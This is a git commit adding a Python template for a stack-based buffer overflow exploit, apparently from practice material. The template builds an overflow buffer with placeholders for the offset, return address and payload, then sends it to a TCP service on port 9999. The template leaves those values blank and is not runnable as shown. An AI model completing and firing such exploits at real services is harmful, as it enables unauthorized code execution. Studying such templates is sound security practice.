ae6c732f429cbcfd99c8f2df1aad65ec0d8b32d8
Sivadath <52615657+sivadathdev@users.noreply.github.com>
2022-04-22 01:00:19 -0500

    Create module.py
    Finding the right module

---
+++ stack-based-buffer-overflows/module.py
@@ -0,0 +1,24 @@
+import socket
+
+ip = ""
+port = 9999
+
+prefix = ""
+offset = #offset here
+overflow = "A" * offset
+retn = "" #retn addr here
+padding = ""
+payload = ""
+postfix = ""
+
+buffer = prefix + overflow + retn + padding + payload + postfix
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+try:
+  s.connect((ip, port))
+  print("Sending evil buffer...")
+  s.send(bytes(buffer + "\r\n", "latin-1"))
+  print("Done!")
+except:
+  print("Could not connect.")
